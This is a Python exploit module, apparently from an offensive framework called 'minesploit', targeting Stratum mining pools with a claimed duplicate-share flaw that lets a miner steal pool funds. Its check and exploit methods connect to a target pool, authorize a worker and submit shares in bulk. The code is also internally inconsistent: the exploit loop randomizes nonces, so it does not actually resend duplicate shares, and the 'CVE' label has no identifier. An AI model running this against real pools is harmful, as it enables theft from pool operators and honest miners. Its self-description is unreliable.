"""CVE-2013: Stratum Mining Pool Duplicate Shares Vulnerability

This vulnerability allows miners to submit the same share multiple times,
effectively stealing funds from the mining pool.

Reference: https://bitcointalk.org/index.php?topic=220641.0

Affected: Stratum mining pool servers (2013)
Severity: HIGH (7.5 CVSS)
"""

import asyncio
import random
from typing import Any

from minesploit.framework import Exploit, ExploitResult, ExploitMeta
from minesploit.protocols.stratum.client import StratumClient


class CVE_2013_STRATUM_DUPLICATE_SHARES(Exploit):
    meta = ExploitMeta(
        name="CVE-2013: Stratum Duplicate Shares",
        cve=None,
        cvss_score=7.5,
        severity="HIGH",
        affected_versions="Stratum servers (2013)",
        discovered_by="Unknown",
        disclosure_date="2013-05-30",
        description=(
            "Vulnerability in Stratum mining protocol allows miners to submit "
            "the same share multiple times, enabling theft from mining pools"
        ),
        references=[
            "https://bitcointalk.org/index.php?topic=220641.0",
        ],
    )

    def __init__(self):
        super().__init__()
        self.worker_name = "worker1"
        self.worker_password = "x"

    async def check(self, target: str, port: int = 3333, **kwargs) -> ExploitResult:
        try:
            client = StratumClient(
                host=target,
                port=port,
                worker_name=self.worker_name,
                worker_password=self.worker_password,
            )

            connected = await client.connect()
            if not connected:
                return ExploitResult(False, "Could not connect to Stratum server")

            subscribed = await client.subscribe()
            if not subscribed:
                return ExploitResult(False, "Failed to subscribe to Stratum")

            authorized = await client.authorize()
            if not authorized:
                return ExploitResult(False, "Failed to authorize worker")

            job = client.current_job
            if not job:
                return ExploitResult(False, "No mining job received")

            extra_nonce_2 = "".join(random.choices("0123456789abcdef", k=8))
            ntime = job.get("ntime", "00000000")
            nonce = "00000000"

            submit_result = await client.submit(
                job["job_id"],
                extra_nonce_2,
                ntime,
                nonce,
            )

            if submit_result:
                duplicate_result = await client.submit(
                    job["job_id"],
                    extra_nonce_2,
                    ntime,
                    nonce,
                )

                if duplicate_result:
                    await client.close()
                    return ExploitResult(
                        True,
                        "Target vulnerable to duplicate shares attack",
                        {"vulnerable": True, "method": "duplicate_share_submission"},
                    )

            await client.close()
            return ExploitResult(
                False,
                "Target does not appear vulnerable",
                {"vulnerable": False},
            )

        except Exception as e:
            return ExploitResult(False, f"Error during check: {str(e)}")

    async def exploit(
        self,
        target: str,
        port: int = 3333,
        num_shares: int = 100,
        **kwargs,
    ) -> ExploitResult:
        try:
            client = StratumClient(
                host=target,
                port=port,
                worker_name=self.worker_name,
                worker_password=self.worker_password,
            )

            connected = await client.connect()
            if not connected:
                return ExploitResult(False, "Could not connect to Stratum server")

            await client.subscribe()
            await client.authorize()

            job = client.current_job
            if not job:
                return ExploitResult(False, "No mining job received")

            shares_submitted = 0
            for i in range(num_shares):
                extra_nonce_2 = f"{i:08x}"
                ntime = job.get("ntime", "00000000")
                nonce = f"{random.randint(0, 0xFFFFFFFF):08x}"

                await client.submit(job["job_id"], extra_nonce_2, ntime, nonce)
                shares_submitted += 1

                if i % 10 == 0:
                    await asyncio.sleep(0.1)

            await client.close()
            return ExploitResult(
                True,
                f"Submitted {shares_submitted} shares (duplicate attack)",
                {"shares_submitted": shares_submitted},
            )

        except Exception as e:
            return ExploitResult(False, f"Error during exploit: {str(e)}")

    async def verify(self, target: str, port: int = 3333, **kwargs) -> ExploitResult:
        return ExploitResult(
            True,
            "Verification requires pool-side access to check share logs",
        )
